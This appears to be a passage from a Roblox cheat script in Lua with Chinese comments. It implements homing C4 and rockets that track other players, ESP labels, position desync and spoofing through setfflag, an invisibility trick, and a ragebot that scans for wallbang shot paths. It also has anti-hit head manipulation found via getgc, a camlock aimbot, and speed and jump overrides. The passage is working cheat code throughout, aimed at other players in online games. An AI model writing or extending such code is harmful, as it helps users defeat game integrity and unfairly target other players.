        end)
    end

    local function CF_AddESP(projectile, textName)
        pcall(function()
            local billboard = Instance.new("BillboardGui")
            billboard.Name        = "CF_RealtimeESP"
            billboard.Size        = UDim2.new(0, 120, 0, 50)
            billboard.StudsOffset = Vector3.new(0, 1.5, 0)
            billboard.AlwaysOnTop = true

            local textLabel = Instance.new("TextLabel")
            textLabel.Size                   = UDim2.new(1, 0, 1, 0)
            textLabel.BackgroundTransparency = 1
            textLabel.TextColor3             = Color3.fromRGB(0, 255, 200)
            textLabel.TextStrokeTransparency = 0.2
            textLabel.TextSize               = 13
            textLabel.Font                   = Enum.Font.GothamBold
            textLabel.Text                   = textName or "Target"
            textLabel.Parent                 = billboard

            billboard.Parent = projectile
        end)
    end

    local function CF_GetSmartPath(currentPos, targetPos, raycastParams)
        local dirToTarget = (targetPos - currentPos).Unit
        local totalDist   = (targetPos - currentPos).Magnitude

        local floorCheck = workspace:Raycast(currentPos, Vector3.new(0, -CFly.SafeWallDistance * 1.5, 0), raycastParams)
        local verticalBias = floorCheck and Vector3.new(0, 1.2, 0) or Vector3.new(0, 0, 0)

        local lookAheadDist = math.min(totalDist, 40)
        local directRay = workspace:Raycast(currentPos, dirToTarget * lookAheadDist, raycastParams)

        if not directRay then
            return (dirToTarget + verticalBias).Unit, false
        end

        local sampleAngles = {
            Vector3.new(0, 1, 0), Vector3.new(0, -1, 0),
            Vector3.new(1, 0, 0), Vector3.new(-1, 0, 0),
            Vector3.new(0.7, 0.7, 0), Vector3.new(-0.7, 0.7, 0),
            Vector3.new(0.7, 0, 0.7), Vector3.new(-0.7, 0, 0.7),
            Vector3.new(0, 0.5, 1),   Vector3.new(1, 0.5, 0.5),
            Vector3.new(-1, 0.5, 0.5),
        }

        local bestDir       = dirToTarget
        local maxOpenScore  = -1
        local foundSafePath = false
        local probeRadius   = CFly.NarrowSpaceMode and 4.0 or 8.0

        for _, offset in ipairs(sampleAngles) do
            local checkVector = offset * probeRadius
            local samplePoint = currentPos + checkVector
            local selfTest    = workspace:Raycast(currentPos, checkVector, raycastParams)
            if not selfTest then
                local opennessRay = workspace:Raycast(samplePoint, (targetPos - samplePoint).Unit * 25, raycastParams)
                local openScore = opennessRay and (opennessRay.Position - samplePoint).Magnitude or 25
                if openScore > maxOpenScore then
                    maxOpenScore  = openScore
                    bestDir       = (samplePoint - currentPos).Unit
                    foundSafePath = true
                end
            end
        end

        if not foundSafePath then
            local randomRoll = Vector3.new(math.random(-1, 1), math.random(0.2, 1), math.random(-1, 1)).Unit
            return randomRoll, true
        end

        return (bestDir + verticalBias).Unit, true
    end

    -- ================================================================
    -- C4 追踪 + Bullet 追踪
    -- ================================================================
    if VParts then
        VParts.ChildAdded:Connect(function(Projectile)
            if not CFly.C4Enabled then return end
            task.wait()

            if Projectile.Name ~= "TransIgnore" then return end
            if not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild("C4") then return end

            pcall(function()
                if Projectile:FindFirstChild("BodyForce") then Projectile.BodyForce:Destroy() end
                if Projectile:FindFirstChild("BodyAngularVelocity") then Projectile.BodyAngularVelocity:Destroy() end
                if Projectile:FindFirstChild("Sound") then Projectile.Sound:Destroy() end
            end)

            CF_AddESP(Projectile, "C4")

            local BV = Instance.new("BodyVelocity", Projectile)
            BV.MaxForce = Vector3.new(1e9, 1e9, 1e9)
            BV.Velocity = Vector3.new()

            local BG = Instance.new("BodyGyro", Projectile)
            BG.P = 2.0e5
            BG.MaxTorque = Vector3.new(1e9, 1e9, 1e9)

            local raycastParams = RaycastParams.new()
            raycastParams.FilterType = Enum.RaycastFilterType.Exclude
            local excludeList = {Projectile, LocalPlayer.Character}
            local targetChar = CF_GetTarget()
            if targetChar then table.insert(excludeList, targetChar) end
            raycastParams.FilterDescendantsInstances = excludeList
            raycastParams.IgnoreWater = true

            local stuckTimer    = 0
            local lastPos       = Projectile.Position
            local lastTrailTime = 0
            local currentVel    = Vector3.new()

            task.spawn(function()
                while Projectile and Projectile.Parent and CFly.C4Enabled do
                    local dt = RunService.RenderStepped:Wait()
                    local currentTargetChar = CF_GetTarget()

                    if currentTargetChar and currentTargetChar:FindFirstChild("HumanoidRootPart") then
                        local targetHRP = currentTargetChar.HumanoidRootPart
                        local targetPos = targetHRP.Position - Vector3.new(0, 2.8, 0)
                        local currentPos = Projectile.Position

                        if (currentPos - lastPos).Magnitude > 1.8 and (tick() - lastTrailTime) > 0.12 then
                            CF_CreateTrail(lastPos, currentPos)
                            lastTrailTime = tick()
                        end

                        local distToTarget = (currentPos - targetPos).Magnitude

                        if (currentPos - lastPos).Magnitude < 0.04 then
                            stuckTimer = stuckTimer + dt
                            if stuckTimer > 0.12 then
                                BV.Velocity = Vector3.new(math.random(-60, 60), math.random(10, 60), math.random(-60, 60))
                                stuckTimer  = 0
                                task.wait(0.04)
                            end
                        else
                            stuckTimer = 0
                        end
                        lastPos = currentPos

                        local moveDir, isAvoiding = CF_GetSmartPath(currentPos, targetPos, raycastParams)
                        local targetSpeed = CFly.C4Speed
                        if distToTarget <= 4.0 then
                            targetSpeed = math.clamp(distToTarget * 25, 15, CFly.C4Speed * 0.5)
                        elseif isAvoiding then
                            targetSpeed = CFly.C4Speed * 0.75
                        end

                        local desiredVel = moveDir * targetSpeed
                        currentVel = currentVel:Lerp(desiredVel, 0.35)
                        BV.Velocity = currentVel

                        if BV.Velocity.Magnitude > 0.1 then
                            local targetCF = CFrame.lookAt(currentPos, currentPos + BV.Velocity.Unit)
                            BG.CFrame = BG.CFrame:Lerp(targetCF, 0.4)
                        end
                    else
                        BV.Velocity = Vector3.new(0, 0, 0)
                    end

                    if CFly.Break then
                        CFly.Break = false
                        break
                    end
                end
                if BV then BV:Destroy() end
                if BG then BG:Destroy() end
            end)
        end)

        local validRocketNames = {
            ["RPG_Rocket"]             = true,
            ["GrenadeLauncherGrenade"] = true,
            ["SBL_Rocket"]             = true,
            ["Hallows_Rocket3"]        = true,
            ["Hallows_Rocket2"]        = true,
            ["FireworkLauncher_Rocket"]= true,
            ["Hallows_Rocket"]         = true,
            ["AT4_Rocket"]             = true,
            ["Rpg18"]                  = true,
        }

        VParts.ChildAdded:Connect(function(Projectile)
            if not CFly.RocketEnabled then return end
            task.wait()

            if not validRocketNames[Projectile.Name] then return end
            if not LocalPlayer.Character then return end

            pcall(function()
                if Projectile:FindFirstChild("BodyForce") then Projectile.BodyForce:Destroy() end
                if Projectile:FindFirstChild("RotPart") and Projectile.RotPart:FindFirstChild("BodyAngularVelocity") then
                    Projectile.RotPart.BodyAngularVelocity:Destroy()
                end
                if Projectile:FindFirstChild("BodyAngularVelocity") then Projectile.BodyAngularVelocity:Destroy() end
                if Projectile:FindFirstChild("Sound") then Projectile.Sound:Destroy() end
            end)

            CF_AddESP(Projectile, "Bullet")

            local BV = Instance.new("BodyVelocity", Projectile)
            BV.MaxForce = Vector3.new(1e9, 1e9, 1e9)
            BV.Velocity = Vector3.new()

            local BG = Instance.new("BodyGyro", Projectile)
            BG.P = 1.2e5
            BG.MaxTorque = Vector3.new(1e9, 1e9, 1e9)

            local raycastParams = RaycastParams.new()
            raycastParams.FilterType = Enum.RaycastFilterType.Exclude
            local excludeList = {Projectile, LocalPlayer.Character}
            local targetChar = CF_GetTarget()
            if targetChar then table.insert(excludeList, targetChar) end
            raycastParams.FilterDescendantsInstances = excludeList
            raycastParams.IgnoreWater = true

            local currentVel = Vector3.new()

            task.spawn(function()
                while Projectile and Projectile.Parent and CFly.RocketEnabled do
                    RunService.RenderStepped:Wait()
                    local currentTargetChar = CF_GetTarget()

                    if currentTargetChar and currentTargetChar:FindFirstChild("HumanoidRootPart") then
                        local targetHRP = currentTargetChar.HumanoidRootPart
                        local targetPos = targetHRP.Position - Vector3.new(0, 2.5, 0)
                        local currentPos = Projectile.Position

                        local moveDir, _ = CF_GetSmartPath(currentPos, targetPos, raycastParams)
                        local desiredVel = moveDir * CFly.RocketSpeed

                        currentVel = currentVel:Lerp(desiredVel, 0.4)
                        BV.Velocity = currentVel

                        if BV.Velocity.Magnitude > 0.1 then
                            local targetCF = CFrame.lookAt(currentPos, currentPos + BV.Velocity.Unit)
                            BG.CFrame = BG.CFrame:Lerp(targetCF, 0.5)
                        end
                    else
                        BV.Velocity = Vector3.new(0, 0, 0)
                    end

                    if CFly.Break or not Projectile.Parent then
                        CFly.Break = false
                        break
                    end
                end
                if BV then BV:Destroy() end
                if BG then BG:Destroy() end
            end)
        end)

        WSDebris.ChildAdded:Connect(function(Result)
            task.wait()
            if not LocalPlayer.Character then return end
            pcall(function()
                if Result.Name:find("Explosion") or Result.Name == "C4Explosion" then
                    CFly.Break = true
                    task.wait(0.4)
                    CFly.Break = false
                end
            end)
        end)
    else
        warn("[CFly] 未找到 workspace.Debris.VParts，C4/Bullet 追踪无法初始化。")
    end

    -- ================================================================
    -- UI
    -- ================================================================
    local secLeft = Page:Section({Name = "C4 Fly", Side = 1})

    secLeft:Toggle({
        Name = "C4 fly", Flag = "CAT_CF_C4", Default = false,
        Callback = function(v) CFly.C4Enabled = v end,
    }):Keybind({
        Flag = "CAT_CF_C4_KB", Mode = "Toggle",
        Callback = function(v)
            if Library and Library.SetFlags and Library.SetFlags["CAT_CF_C4"] then
                Library.SetFlags["CAT_CF_C4"](v)
            end
        end,
    })

    secLeft:Slider({
        Name = "C4 speed", Flag = "CAT_CF_C4Speed",
        Min = 60, Max = 300, Default = 120, Decimals = 1,
        Callback = function(v) CFly.C4Speed = v end,
    })

    secLeft:Textbox({
        Name = "Target name", Flag = "CAT_CF_TargetName",
        Placeholder = "name (empty = auto)", Default = "",
        Finished = false,
        Callback = function(v) CFly.SpecificTarget = v end,
    })


    local secRight = Page:Section({Name = "Bullet Fly", Side = 2})

    secRight:Toggle({
        Name = "Bullet fly", Flag = "CAT_CF_Rocket", Default = false,
        Callback = function(v) CFly.RocketEnabled = v end,
    }):Keybind({
        Flag = "CAT_CF_Rocket_KB", Mode = "Toggle",
        Callback = function(v)
            if Library and Library.SetFlags and Library.SetFlags["CAT_CF_Rocket"] then
                Library.SetFlags["CAT_CF_Rocket"](v)
            end
        end,
    })

    secRight:Slider({
        Name = "Bullet speed", Flag = "CAT_CF_RocketSpeed",
        Min = 100, Max = 500, Default = 200, Decimals = 1,
        Callback = function(v) CFly.RocketSpeed = v end,
    })

    local secSet = Page:Section({Name = "Projectile Config", Side = 2})

    secSet:Toggle({
        Name = "Narrow space mode", Flag = "CAT_CF_Narrow", Default = true,
        Callback = function(v) CFly.NarrowSpaceMode = v end,
    }):Keybind({
        Flag = "CAT_CF_Narrow_KB", Mode = "Toggle",
        Callback = function(v)
            if Library and Library.SetFlags and Library.SetFlags["CAT_CF_Narrow"] then
                Library.SetFlags["CAT_CF_Narrow"](v)
            end
        end,
    })

    secSet:Slider({
        Name = "Safe wall dist", Flag = "CAT_CF_WallDist",
        Min = 0.4, Max = 3.0, Default = 0.8, Decimals = 0.1,
        Callback = function(v) CFly.SafeWallDistance = v end,
    })

    -- 注意：不再创建自己的黑/白名单 UI。
    -- 黑名单 → 用 PlayerList 的 Whitelist
    -- 白名单 → 用 PlayerList 的 Target List
end




Library:CreateSettingsPage(Window, Watermark, KeybindList, WatermarkConfig)

Players.PlayerAdded:Connect(function(p)
    PL_TargetSearch:Add(p.Name); PL_WhiteSearch:Add(p.Name)

    -- 保存的名单里有他 → 自动勾选
    if table.find(TargetList, p.Name) then
        local cur = PL_TargetSearch:Get() or {}
        if not table.find(cur, p.Name) then
            local newList = table.clone(cur)
            table.insert(newList, p.Name)
            pcall(function() PL_TargetSearch:Set(newList) end)
        end
    end
    if table.find(WhiteList, p.Name) then
        local cur = PL_WhiteSearch:Get() or {}
        if not table.find(cur, p.Name) then
            local newList = table.clone(cur)
            table.insert(newList, p.Name)
            pcall(function() PL_WhiteSearch:Set(newList) end)
        end
    end
end)
Players.PlayerRemoving:Connect(function(p)
    PL_TargetSearch:Remove(p.Name); PL_WhiteSearch:Remove(p.Name); clearBoxes(p)
    if p.Character then
        local t1=p.Character:FindFirstChild("CAT_NameTag")
        local t2=p.Character:FindFirstChild("CAT_FFTag")
        local t3=p.Character:FindFirstChild("CAT_HPTag")
        if t1 then t1:Destroy() end
        if t2 then t2:Destroy() end
        if t3 then t3:Destroy() end
    end
end)
end)() -- end UI IIFE

-- =====================================================================
-- == Invisible: RenderStep restore (priority 200, after Desync's 199)
-- =====================================================================
RunService:BindToRenderStep("InvisFix", 199, function()
    if not Invis_Enabled or DS.Enabled or LF.Enabled then
        Invis_SavedCF = nil
        return
    end
    local char = LocalPlayer.Character
    local hrp  = char and char:FindFirstChild("HumanoidRootPart")

    if hrp and Invis_SavedCF then
        hrp.CFrame    = Invis_SavedCF
        Invis_SavedCF = nil
    end

    if Invis_Track then
        pcall(function() Invis_Track:Stop() end)
    end

    if char then
        for _, p in ipairs(char:GetChildren()) do
            if p:IsA("BasePart") and (p.Name=="Head" or p.Name=="Torso" or p.Name:match("Arm") or p.Name:match("Leg")) then
                if p.Transparency ~= 0.5 then p.Transparency = 0.5 end
            end
        end
    end
end)

-- =====================================================================
-- == LuanFei (Spin Desync) Local Anim Fix
-- =====================================================================
RunService:BindToRenderStep("LuanFeiAnimFix", 199, function()
    if LF.Enabled and not Invis_Enabled then
        if LF.Track1 then pcall(function() LF.Track1:Stop(0) end) end
        if LF.Track2 then pcall(function() LF.Track2:Stop(0) end) end
    end
end)

-- =====================================================================
-- == Smooth Camera
-- =====================================================================
RunService:UnbindFromRenderStep("SmoothMovementCamera")
RunService:BindToRenderStep("SmoothMovementCamera", Enum.RenderPriority.Camera.Value+1, function(dt)
    if not MC.SmoothCam or not Camera then MC.SmoothPos=nil return end
    local cf  = Camera.CFrame
    local pos = cf.Position
    if not MC.SmoothPos then MC.SmoothPos=pos
    else MC.SmoothPos=MC.SmoothPos:Lerp(pos, math.clamp(dt*MC.LerpSpeed,0,1)) end
    Camera.CFrame = CFrame.new(MC.SmoothPos, MC.SmoothPos+cf.LookVector)
end)

-- =====================================================================
-- == Main Heartbeat (split into sub-functions to keep register count low)
-- =====================================================================

local function DoSkinUpdate()
    local now = tick()
    if now - FF_S.LastSkin < 1 then return end
    FF_S.LastSkin = now
    if FF_S.BodyEnabled then
        local char = LocalPlayer.Character
        if char then
            for _, p in ipairs(char:GetChildren()) do
                if IsBodyPart(p) then
                    if not FF_S.BodyProps[p] then
                        FF_S.BodyProps[p]={Material=p.Material,Color=p.Color}
                        p.Material=Enum.Material.ForceField; p.Color=FF_S.Color
                    elseif p.Material~=Enum.Material.ForceField then
                        p.Material=Enum.Material.ForceField; p.Color=FF_S.Color
                    end
                end
            end
        end
    end
    if FF_S.ToolEnabled then
        local char = LocalPlayer.Character
        local tool = char and char:FindFirstChildOfClass("Tool")
        if tool then
            for _, p in ipairs(tool:GetDescendants()) do
                if p:IsA("BasePart") then
                    if not FF_S.ToolProps[p] then
                        FF_S.ToolProps[p] = {Material=p.Material, Color=p.Color}
                    end
                    p.Material = Enum.Material.ForceField
                    p.Color    = FF_S.Color
                end
            end
        end
    end
end

local function DoDesyncLogic()
    if not DS.Enabled or Invis_Enabled then
        DS.AppliedOffset = Vector3.zero
        if not DS.Enabled and DS.Model.Parent then DS.Model.Parent=nil end
        return
    end
    local char = LocalPlayer.Character
    local hrp  = char and char:FindFirstChild("HumanoidRootPart")
    if not hrp then return end
    local ragebotActive = false
    if RB_State and Valid_Pair and Valid_Pair.Target and Valid_Pair.Target.Character then
        local th=Valid_Pair.Target.Character:FindFirstChild("HumanoidRootPart")
        local tu=Valid_Pair.Target.Character:FindFirstChildOfClass("Humanoid")
        if th and tu and tu.Health>0 then
            local tool=char:FindFirstChildOfClass("Tool")
            if tool and tool:FindFirstChild("IsGun") then ragebotActive=true end
        end
    end
    if ragebotActive then
        if DS.Model.Parent then DS.Model.Parent=nil end
        DS.AppliedOffset=Vector3.zero; return
    end
    local clk=os.clock()
    local interval=DS.TPRate>0 and (1/DS.TPRate) or 0
    if clk-DS.LastTPTime >= interval then
        DS.LastTPTime=clk
        DS.Y_Toggle=not DS.Y_Toggle
        local yOff=DS.Y_Toggle and (math.random(0,DS.Y*10)/10) or 0
        local tOff=Vector3.new((math.random()-0.5)*2*DS.X, yOff, (math.random()-0.5)*2*DS.Z)
        local p=RaycastParams.new()
        p.FilterDescendantsInstances={char,DS.Model,Camera}
        p.FilterType=Enum.RaycastFilterType.Exclude
        local rr=workspace:Raycast(hrp.Position, tOff, p)
        if rr then DS.CurrentOffset=(rr.Position+rr.Normal*1.5)-hrp.Position
        else DS.CurrentOffset=tOff end
    end
    if DS.Visualize then
        if DS.Model.Parent~=workspace.Terrain then DS.Model.Parent=workspace.Terrain end
        DS.Model:PivotTo(CFrame.new(hrp.Position+DS.CurrentOffset))
    else
        if DS.Model.Parent then DS.Model.Parent=nil end
    end
    DS.AppliedOffset = DS.CurrentOffset
end

local function DoLuanFeiLogic()
    if not LF.Enabled or Invis_Enabled then return end
    local char = LocalPlayer.Character
    local hum = char and char:FindFirstChildOfClass("Humanoid")
    if not hum or hum.Health <= 0 then return end

    local animator = hum:FindFirstChildOfClass("Animator") or hum
    if not LF.Track1 then
        pcall(function() 
            LF.Track1 = animator:LoadAnimation(LF.Anim1)
            LF.Track1.Priority = Enum.AnimationPriority.Action4 
        end)
    end
    if not LF.Track2 then
        pcall(function() 
            LF.Track2 = animator:LoadAnimation(LF.Anim2)
            LF.Track2.Priority = Enum.AnimationPriority.Action4
            LF.Track2.Looped = true 
        end)
    end

    if LF.Track1 then
        pcall(function()
            if not LF.Track1.IsPlaying then LF.Track1:Play() end
            LF.Track1:AdjustSpeed(0)
            LF.Track1.TimePosition = (LF.Track1.Length > 0 and LF.TimePosRatio * LF.Track1.Length) or LF.TimePosRatio
        end)
    end
    if LF.Track2 then
        pcall(function()
            if not LF.Track2.IsPlaying then LF.Track2:Play() end
            LF.Track2:AdjustSpeed(1)
        end)
    end

    LF.Angle = LF.Angle + LF.SpinSpeed
end

local function ApplySpoofs()
    local now = tick()
    if (DS.Enabled or LF.Enabled) and now - DS.LastFFlagTime >= 1 then
        DS.LastFFlagTime = now
        pcall(setfflag, "S2PhysicsSenderRate", "99999999")
    end

    DoDesyncLogic()
    DoLuanFeiLogic()

    local char = LocalPlayer.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    if not hrp then return end

    local spoofed = false
    local realCF = hrp.CFrame
    local newCF = realCF

    if DS.Enabled and DS.AppliedOffset ~= Vector3.zero then
        newCF = newCF + DS.AppliedOffset
        spoofed = true
    end

    if LF.Enabled and not Invis_Enabled then
        local smoothRotation = CFrame.Angles(
            math.rad(LF.Angle), 
            math.rad(LF.Angle * 1.5), 
            math.rad(LF.Angle * 0.8)
        )
        newCF = newCF * smoothRotation
        spoofed = true
    end

    if spoofed then
        hrp.CFrame = newCF
        RunService:BindToRenderStep("RestoreSpoofCFrame", 199, function()
            if char and hrp and hrp.Parent then hrp.CFrame = realCF end
            if DS.Enabled then DS.AppliedOffset = Vector3.zero end
            RunService:UnbindFromRenderStep("RestoreSpoofCFrame")
        end)
    end
end

local function DoInvisible()
    if not Invis_Enabled or DS.Enabled or LF.Enabled then return end
    local char = LocalPlayer.Character
    local hrp  = char and char:FindFirstChild("HumanoidRootPart")
    local hum  = char and char:FindFirstChildOfClass("Humanoid")
    if not (hrp and hum and hum.Health > 0) then return end

    if not Invis_Track then
        local anim = hum:FindFirstChildOfClass("Animator") or hum
        pcall(function()
            Invis_Track = anim:LoadAnimation(Invis_Anim)
            Invis_Track.Priority = Enum.AnimationPriority.Action
        end)
    end

    if Invis_Track then
        pcall(function()
            if not Invis_Track.IsPlaying then Invis_Track:Play() end
            Invis_Track:AdjustSpeed(0)
            Invis_Track.TimePosition = 0.3
        end)
    end

    Invis_SavedCF = hrp.CFrame
    hrp.CFrame = Invis_SavedCF + Vector3.new(0, -2, 0)
end

-- =====================================================================
-- == 解析1：固定25点向量表 + 随机Roll轴旋转
-- =====================================================================
local ScanVectors = {
    Vector3.new(1, 0, 0), Vector3.new(0, 0, 1), Vector3.new(0, 1, 0),
    -Vector3.new(1, 0, 0), -Vector3.new(0, 0, 1), -Vector3.new(0, 1, 0),
    Vector3.new(1, 1, 0)/math.sqrt(2), Vector3.new(1, 0, 1)/math.sqrt(2), Vector3.new(0, 1, 1)/math.sqrt(2),
    Vector3.new(-1, 1, 0)/math.sqrt(2), Vector3.new(-1, 0, 1)/math.sqrt(2),
    -Vector3.new(1, 0, 1)/math.sqrt(2), -Vector3.new(-1, 0, 1)/math.sqrt(2), -Vector3.new(0, -1, 1)/math.sqrt(2),
    Vector3.new(1, 1, 1)/math.sqrt(3), Vector3.new(-1, 1, 1)/math.sqrt(3), Vector3.new(1, 1, -1)/math.sqrt(3),
    -Vector3.new(1, 1, 1)/math.sqrt(3), -Vector3.new(1, -1, 1)/math.sqrt(3),
    Vector3.new(1,2,0)/math.sqrt(5), Vector3.new(-1,2,0)/math.sqrt(5), Vector3.new(1,0,2)/math.sqrt(5), Vector3.new(-1,0,2)/math.sqrt(5),
    -Vector3.new(-1,0,2)/math.sqrt(5), -Vector3.new(1,0,2)/math.sqrt(5),
}

local function GetOffsets_Algo1(firePos, targetPos, offset)
    if not offset or offset <= 0 then return {firePos} end
    local offsets = {firePos} -- 优先检测中心点
    local cfOffset = CFrame.new(firePos, targetPos) * CFrame.Angles(0, 0, math.rad(math.random(1, 90)))
    for _, pos in ipairs(ScanVectors) do
        table.insert(offsets, cfOffset * (pos * offset))
    end
    return offsets
end

-- =====================================================================
-- == 解析2：纯净版斐波那契半球 (无区域划分、无防重复偏移)
-- =====================================================================
local function GetOffsets_Algo2(center, poleDir, radius, count)
    if not radius or radius <= 0 or count <= 0 then return {center} end
    local offsets = {center} -- 优先检测中心点
    local PHI = 0.6180339887
    
    -- 构建正交基 (用于确定半球的朝向)
    local arb = math.abs(poleDir.X) < 0.9 and Vector3.new(1,0,0) or Vector3.new(0,1,0)
    local t1 = poleDir:Cross(arb).Unit
    local t2 = poleDir:Cross(t1).Unit

    for i = 0, count - 1 do
        -- 斐波那契黄金角
        local phi = i * PHI * 2 * math.pi
        -- 均匀分布：cosTheta 从 1 (伞尖) 到 0 (赤道)
        local cosT = 1 - (i + 0.5) / count
        local sinT = math.sqrt(1 - cosT * cosT)
        -- 随机半径，使点分布在半球体积内而不是仅在表面
        local r = radius * (math.random()^(1/3))
        
        local dir = t1 * (sinT * math.cos(phi)) + t2 * (sinT * math.sin(phi)) + poleDir * cosT
        table.insert(offsets, center + dir * r)
    end
    return offsets
end

-- =====================================================================
-- == 核心 Ragebot 逻辑
-- =====================================================================
local function DoRagebot()
    if not RB_State then Valid_Pair=nil; Locked_Path=nil; return end
    local target=GetTarget()
    if not target or not target.Character then Valid_Pair=nil; Locked_Path=nil; return end
    if Locked_Path and Locked_Path.Target~=target then Locked_Path=nil end
    
    local myRoot=LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    local tRoot=target.Character:FindFirstChild("HumanoidRootPart")
    if not myRoot or not tRoot then return end
    local myPos=GetLocalRealPosition()
    local Prediction = 0.12

local tPos = tRoot.Position + (tRoot.AssemblyLinearVelocity * Prediction)

    -- 1. 缓存机制 (如果上一发的轨迹依然有效，直接复用，不扫描)
    if Locked_Path then
        local dO=(myPos-Locked_Path.MyPos).Magnitude
        local dH=(tPos-Locked_Path.TPos).Magnitude
        local inRange=(myPos-Locked_Path.AbsO).Magnitude<=Origin_Radius
                   and (tPos-Locked_Path.AbsH).Magnitude<=Hit_Radius
        if dO<=WB.Threshold and dH<=WB.Threshold and inRange then
            if CheckWallbang(Locked_Path.AbsO,Locked_Path.AbsH) then
                Valid_Pair={Origin=Locked_Path.AbsO,Hit=Locked_Path.AbsH,Target=target}
                WB.Cached=true; return
            end
        end
        Locked_Path=nil
    end

    -- 2. 扫描速率限制
    if tick()-WB.LastScan < 1/ScanRate then return end
    WB.LastScan=tick()
    WB.Round=WB.Round+1 -- 轮数+1，用于交替算法

    -- 3. 交替使用两种解析算法
    local newOrigin, newTarget
    
    if WB.Round % 2 == 0 then
        -- 【双数轮】：使用 解析1 (25点固定向量 + 随机旋转)
        newOrigin = GetOffsets_Algo1(myPos, tPos, Origin_Radius)
        newTarget = GetOffsets_Algo1(tPos, myPos, Hit_Radius)
    else
        -- 【单数轮】：使用 解析2 (纯净版斐波那契半球)
        local oPole = (tPos - myPos)
        if oPole.Magnitude < 0.001 then return end
        oPole = oPole.Unit
        local hPole = -oPole -- 敌人的半球朝向玩家
        
        -- 这里会读取你 UI 菜单里的 Origin_Scans 和 Hit_Scans 数量
        newOrigin = GetOffsets_Algo2(myPos, oPole, Origin_Radius, Origin_Scans)
        newTarget = GetOffsets_Algo2(tPos, hPole, Hit_Radius, Hit_Scans)
    end

    -- 4. 双重循环穷举寻找合法弹道 (找到即返回，不再比较距离)
    local bestPO, bestPH = nil, nil

    for _, pO in ipairs(newOrigin) do
        for _, pH in ipairs(newTarget) do
            if CheckWallbang(pO, pH) then
                -- 找到第一条合法路径，立即锁定并跳出循环
                bestPO = pO
                bestPH = pH
                break
            end
        end
        if bestPO then break end -- 找到就跳出外层循环
    end

    -- 5. 更新缓存与射击对
    if bestPO then
        Locked_Path={AbsO=bestPO,AbsH=bestPH,Target=target,MyPos=myPos,TPos=tPos}
        Valid_Pair={Origin=bestPO,Hit=bestPH,Target=target}
        WB.Cached=false
    else
        Valid_Pair=nil
    end
end

RunService.Heartbeat:Connect(function()
    DoSkinUpdate()
    ApplySpoofs()
    DoInvisible()
    DoRagebot()
end)

-- == AntiHit RenderStepped (Hide head / Hands up) ==
RunService:BindToRenderStep("CAM_FOV_Enforce", Enum.RenderPriority.Camera.Value+2, function()
    if CAM_FOV then Camera.FieldOfView = CAM_FOV end
    if AMB.Enabled then
        -- 挂在 Camera 下，游戏不会删它
        local cc = Camera:FindFirstChild("CATColorCorr")
        if not cc then
            cc = Instance.new("ColorCorrectionEffect")
            cc.Name   = "CATColorCorr"
            cc.Parent = Camera
        end
        cc.TintColor  = AMB.Color
        cc.Brightness = AMB.Brightness
        cc.Contrast   = AMB.Density * 0.3
        cc.Saturation = -(AMB.Density * 0.5)
        cc.Enabled    = true
    else
        local cc = Camera:FindFirstChild("CATColorCorr")
        if cc then cc.Enabled = false end
    end
end)

-- == AntiHit RenderStepped (Head mode / Hands up) ==
RunService.RenderStepped:Connect(function(dt)
    if not HeadMode and not HandsModSelection then return end
    local char = LocalPlayer.Character
    if not (char and char.Parent) then return end
    local torso = char:FindFirstChild("UpperTorso") or char:FindFirstChild("Torso")
    local head  = char:FindFirstChild("Head")
    local hrp   = char:FindFirstChild("HumanoidRootPart")

    if HeadMode then
        local neck = (head and head:FindFirstChild("Neck")) or (torso and torso:FindFirstChild("Neck"))
        if HeadMode == "Hide head" and neck then
            if not OriginalNeckC0 then OriginalNeckC0 = neck.C0; OriginalNeckC1 = neck.C1 end
            neck.C0 = AC.NeckC0
            neck.C1 = AC.NeckC1
        elseif (HeadMode == "Yaw head" or HeadMode == "Custom") and hrp then
            if not DoTweak_fn then
                for _, v in getgc(true) do
                    if type(v) == "function" then
                        local info = debug.getinfo(v)
                        if info and info.name == "DoTweak" and info.numparams == 11 then
                            DoTweak_fn = v; break
                        end
                    end
                end
            end
            if DoTweak_fn then
                local angle
                if HeadMode == "Yaw head" then
                    HeadYawTime = HeadYawTime + dt
                    angle = math.sin(HeadYawTime * HeadRotSpeed) * math.rad(HeadYaw)
                else -- Custom: 固定角度
                    angle = math.rad(HeadCustomYaw)
                end
                local neckRot = CFrame.Angles(angle, 0, 0)
                pcall(DoTweak_fn,
                    char,
                    hrp.Position + Vector3.new(0, 10, 0),
                    hrp.Position,
                    neckRot.LookVector,
                    true, false, true, true, true, -- 第6个参数设为false，不再调整干涉手臂姿态
                    9e9, true
                )
            end
        end
    end

    if HandsModSelection and torso then
        local tool = char:FindFirstChildOfClass("Tool")
        if HandsModSelection == "Hands up" and tool then
            local lS = torso:FindFirstChild("Left Shoulder")
            local rS = torso:FindFirstChild("Right Shoulder")
            if lS then lS.C0 = AC.LShoulder end
            if rS then rS.C0 = AC.RShoulder end
            for _, v in ipairs(tool:GetDescendants()) do
                if v.Name == "Mag6D_Torso"  and v:IsA("Motor6D") then v.C0 = AC.Mag6D  end
                if v.Name == "Tool6D_Torso" and v:IsA("Motor6D") then v.C0 = AC.Tool6D end
            end
        end
    end
end)

-- == CamLock + Speed/Jump RenderStepped ==
RunService.RenderStepped:Connect(function(dt)
    local char=LocalPlayer.Character
    local hum=char and char:FindFirstChildOfClass("Humanoid")
    if hum then
        if SpeedState and hum.WalkSpeed~=SpeedValue then hum.WalkSpeed=SpeedValue end
        if JumpState then
            if not hum.UseJumpPower then hum.UseJumpPower=true end
            if hum.JumpPower~=JumpValue then hum.JumpPower=JumpValue end
        end
    end
    if not ShouldLock() then CL.CurrentTarget=nil; CL.LockedPart=nil; return end
    local origin=Camera.CFrame.Position
    CL.ScanTimer=CL.ScanTimer+dt
    if CL.ScanTimer>0.1 then
        CL.ScanTimer=0
        local best,bDist,b3D=nil,CL.FOV,math.huge
        for _,p in ipairs(Players:GetPlayers()) do
            if p~=LocalPlayer and p.Character then
                if not table.find(WhiteList,p.Name) and (not CL.TargetOnly or table.find(TargetList,p.Name)) then
                    local ph=p.Character:FindFirstChild("Humanoid"); local pr=p.Character:FindFirstChild("HumanoidRootPart")
                    if ph and ph.Health>(CL.DownCheck and 15 or 0) and pr then
                        local sp,on=Camera:WorldToViewportPoint(pr.Position)
                        local sd=(Vector2.new(sp.X,sp.Y)-Vector2.new(Camera.ViewportSize.X/2,Camera.ViewportSize.Y/2)).Magnitude
                        local d3=(pr.Position-origin).Magnitude
